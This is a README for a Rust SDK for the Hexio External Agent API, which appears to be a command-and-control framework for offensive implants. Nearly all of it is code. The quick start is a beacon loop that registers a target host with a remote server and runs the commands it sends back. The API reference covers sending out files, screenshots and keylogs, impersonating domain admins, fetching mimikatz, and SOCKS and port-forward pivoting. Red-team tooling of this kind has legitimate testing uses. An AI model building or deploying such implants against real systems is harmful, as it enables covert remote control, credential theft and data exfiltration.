# Hexio External Agent SDK for Rust

A Rust client for the Hexio External Agent REST API. Built on `ureq` (blocking HTTP, pure Rust, no async runtime required) and `serde_json`.

## Installation

Add to your `Cargo.toml`:

```toml
[dependencies]
hexio-sdk = { path = "../ExternalAgentSDK/rust" }
```

Or from a git source:

```toml
[dependencies]
hexio-sdk = { git = "https://your-repo/hexio.git", branch = "master" }
```

## Quick Start

```rust
use hexio_sdk::{HexioClient, RegisterRequest};
use std::{thread, time::Duration};

fn main() -> hexio_sdk::Result<()> {
    let mut client = HexioClient::new("http://10.0.0.1:9000", "my-passphrase");

    let reg = client.register(RegisterRequest {
        hostname: "TARGET-PC".into(),
        ip: "10.0.0.50".into(),
        user: "admin".into(),
        os: "Windows 10".into(),
        process: "agent.exe".into(),
        pid: 4832,
        client_type: "my_rust_agent".into(),
        sleep_time: 5,
    })?;
    println!("Registered as agent {}", reg.agent_id);

    loop {
        let checkin = client.checkin()?;
        for cmd in checkin.commands {
            let output = execute_locally(&cmd.command);
            client.command_response(cmd.id, &cmd.command, &output)?;
        }
        thread::sleep(Duration::from_secs(5));
    }
}

fn execute_locally(_cmd: &str) -> String {
    "result".into()
}
```

## API Reference

### Client Creation

```rust
let mut client = HexioClient::new(base_url, passphrase);
```

### Registration

```rust
let reg = client.register(RegisterRequest { .. })?;
// reg.agent_id, reg.token
// client.token set automatically
```

### Checkin / Sync

```rust
let checkin = client.checkin()?;
// checkin.commands: Vec<Command>

let sync = client.sync(Some(10), Some(3))?;     // sleep=10, jitter=3
let sync = client.sync(None, None)?;             // no sleep update

// Raw sync with arbitrary fields
let sync = client.sync_raw(&serde_json::json!({
    "commands": [ { "command_id": 42, "command": "whoami", "response": "..." } ],
    "screenshots": [ { "filename": "s.png", "data": "<b64>" } ],
}))?;
```

### Command Response

```rust
client.command_response(42, "whoami", "nt authority\\system")?;
```

### File Downloads

```rust
// Low-level
let init = client.download_init(DownloadInitRequest { .. })?;
client.download_chunk(&init.download_id, &chunk_bytes)?;
client.download_cancel(&download_id)?;

// One-shot convenience
let id = client.download_file("/tmp/data.db", &bytes, 65536)?;
```

### Screenshots & Keylogs

```rust
client.screenshot("screen.png", &image_bytes)?;
client.keylog("keys.txt", "captured keystrokes")?;
```

### Impersonation

```rust
client.set_impersonation("DOMAIN\\Admin")?;
client.clear_impersonation()?;
```

### Side Channels

```rust
client.sidechannel("shell-1", "<base64-output>")?;
```

### File Requests

```rust
use hexio_sdk::FileRequest;
let resp = client.request_files(FileRequest {
    bof_files: Some(vec!["whoami.o".into()]),
    pe_files: Some(vec!["mimikatz.exe".into()]),
    ..Default::default()
})?;
```

### SOCKS Proxy

```rust
let resp = client.socks_open(None)?;       // auto-assign port
let resp = client.socks_open(Some(1080))?; // specific port
client.socks_close()?;
let data = client.socks_sync(&payload)?;
```

### Port Forwarding

```rust
client.portfwd_open(8080, "10.0.0.5", 3389)?;
client.portfwd_close(8080)?;
let data = client.portfwd_sync(&payload)?;
```

## Error Handling

All methods return `Result<T, HexioError>`. API errors preserve the HTTP status and server message:

```rust
match client.register(req) {
    Ok(reg) => println!("ok: {}", reg.agent_id),
    Err(HexioError::Api { status, message }) => eprintln!("api {}: {}", status, message),
    Err(e) => eprintln!("transport error: {}", e),
}
```

## HTTPS

`ureq` supports TLS out of the box via rustls. `https://` URLs work without additional configuration.
